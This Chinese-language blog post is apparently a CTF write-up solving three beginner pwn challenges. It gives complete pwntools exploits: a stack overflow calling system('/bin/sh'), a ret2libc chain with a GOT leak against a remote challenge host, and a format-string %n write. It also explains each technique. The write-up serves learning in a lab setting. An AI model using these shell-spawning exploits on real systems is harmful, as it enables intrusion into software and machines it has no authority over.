---
title: 「xCTF」Pwn - cgpwn2|level3|CGfsb WriteUps
date: 2021-11-12 14:44:51
tags: ['xCtf', 'Pwn', 'WriteUp']
categories: ['CTF']
authors: [nova]
index_img: https://novanoir.moe/img/ctf_logo_2.png
banner_img: https://novanoir.moe/img/ctf_logo_2.png
---
## cgpwn2 | level3 | CGfsb

### **碎碎念**

因为这半个月事情很多（摆邮major/APEX/期中考），加上新环境一直有问题，所以基本上没有什么关于CTF的内容:I但是其他的事情也基本没什么进展

马上又要打比赛了，想着临时抱佛jio冲一哈，先把这几个简单的栈相关的题目搞一下:<

原本想要每题都做一个详尽的WP水文章来着，但是好像比较基础就合在一起了:>

<!--truncate-->

### **cgpwn2**

直接拖进checksec/ida

![https://cdn.novanoir.moe/img/image-20211112104246870.png](https://cdn.novanoir.moe/img/image-20211112104246870.png)

![https://cdn.novanoir.moe/img/image-20211112105108027.png](https://cdn.novanoir.moe/img/image-20211112105108027.png)

![https://cdn.novanoir.moe/img/image-20211112112126099.png](https://cdn.novanoir.moe/img/image-20211112112126099.png)

这题意图就很明显了：在第一个gets中输入指令（"/bin/sh"），第二个gets中溢出然后调用system函数

> system + 返回地址 + 指令

于是找出偏移和地址，轻松写出exp>

```
from pwn import *

context(log_level='debug')

r = process('./53c24fc5522e4a8ea2d9ad0577196b2f')

r.recvuntil('your name\\n')
r.sendline(b'/bin/sh')

cmd_addr = 0x0804A080
system_addr = 0x08048420
payload = b'A'*0x2A + p32(system_addr) + p32(0) + p32(cmd_addr)

r.recvuntil('here:\\n')
r.sendline(payload)
r.interactive()
```

拿到flag`cyberpeace{53e372c0f3209a11ef4429e8e2546bbf}`

### **level3**

看题目介绍应该是ret2libc的题，这是我第一题libc泄露，所以着重讲讲

> 知识点：CTF-WIKI

下载下来是一个gz压缩文件，解压出来是一个so文件和elf文件

（结果我tar解压的时候不知道为什么名字不能自动补全，手搓了32位md5码的文件名了属于是）

按照惯例checksec看一下(checksec也不知道为什么软连接搞不上，我要吐力)

![https://cdn.novanoir.moe/img/image-20211112114145579.png](https://cdn.novanoir.moe/img/image-20211112114145579.png)

![https://cdn.novanoir.moe/img/image-20211112140131570.png](https://cdn.novanoir.moe/img/image-20211112140131570.png)

总之先上EXP:

```
from pwn import *

context(log_level="DEBUG")
# r = process("./level3")
r = remote("111.200.241.244", 53829)
elf = ELF("./level3")
libc = ELF("./libc_32.so.6")

write_plt = elf.plt["write"]
write_got = elf.got["write"]
func = elf.sym["vulnerable_function"]

payload1 = b'a'*0x88 + b'aaaa' + p32(write_plt) + p32(func) + p32(1) + p32(write_got) + p32(4)
r.recvuntil("Input:\\n")
r.sendline(payload1)

write_addr = u32(r.recv(4))

write_libc = libc.sym["write"]
system_libc = libc.sym["system"]
bin_sh_libc = next(libc.search(b"/bin/sh"))
print('write_addr: ', hex(write_addr))

libc_base = write_addr - write_libc
system_addr = libc_base + system_libc
bin_sh_addr = libc_base + bin_sh_libc

print('bin_sh_addr: ', hex(bin_sh_addr))
print('system_addr: ', hex(system_addr))

payload2 = b'a'*0x88 + b'aaaa' + p32(system_addr) + p32(0) + p32(bin_sh_addr)
r.recvuntil("Input:\\n")
r.send(payload2)
r.interactive()
```

这里有个很奇怪的点，我写exp的时候用的是Python3.10.0，但是本地调试的时候这个exploit是过不了的，换成py2又可以过

关键是我只更改了`bin_sh_libc`这里的代码，py2用的是`generator.next()`，而py3用的是`next(generator)`，但是结果是一样的。

我把最后的payload打印出来对比也没有任何区别（肉眼上）。但是Py3远程又是能过的^ ^，不知道什么高手情况。

#### **分析**

整个程序非常简单，也只有一个`vulnerable_function`可以利用，但是程序中并没有利用到system函数，这里就自然的引出了GOT表泄露。

得益于libc的延迟绑定机制，我们如果知道libc中某个函数的地址，就可以通过其在程序中的地址与libc中地址的差算出偏移。又由于libc.so动态链接库中的函数之间相对偏移是固定的，得到了偏移，再通过libc中我们想要的函数的地址，就可以确定其函数在程序当中的地址。

```
payload1 = b'a'*0x88 + b'aaaa' + p32(write_plt) + p32(func) + p32(1) + p32(write_got) + p32(4)
```

首先看payload1，先填充buf不多说，覆盖返回地址这里值得注意：

我们先将返回地址覆盖为write_plt，再将func作为write函数的返回地址，后面再填write的三个参数，这样做的话在write结束后就又会跳转会`vulnerable_function()`这里，便可以截到write的GOT地址

接下来就是算偏移和找地址，不多赘述。

此时程序又一次运行到了`read()`函数这里，那直接轻松覆盖一个system函数上去就好了:>

### **CGfsb**

![https://cdn.novanoir.moe/img/image-20211112141233440.png](https://cdn.novanoir.moe/img/image-20211112141233440.png)

一眼FormatString

需要使得`0x0804A068`这个地址的变量`pwnme`为8

先找到格式化字符串的参数在第几个

```
from pwn import *

context(log_level="DEBUG")
r = process("./e41a0f684d0e497f87bb309f91737e4d")

r.sendlineafter("your name:\\n", p32(0x0804A068))
r.recvuntil('please:\\n')
r.sendline(b'AAAA' + b'%x.'*0x10)
r.recvuntil("is:\\n")
print(r.recv())
```

![https://cdn.novanoir.moe/img/image-20211112142129570.png](https://cdn.novanoir.moe/img/image-20211112142129570.png)

可以看到41414141在第十个参数的位置，那么我们只需要把pwnme的地址写入，然后通过%n把8写入它就好了

最后的exp:

```
from pwn import *

context(log_level="DEBUG")
r = process("./e41a0f684d0e497f87bb309f91737e4d")

r.sendlineafter("your name:\\n", p32(0x0804A068))
r.recvuntil('please:\\n')
r.sendline(p32(0x0804A068) + b'AAAA' + b'%10$n')
r.interactive()
```

至此，宣告PWN的新手区AK（不容易啊🥵）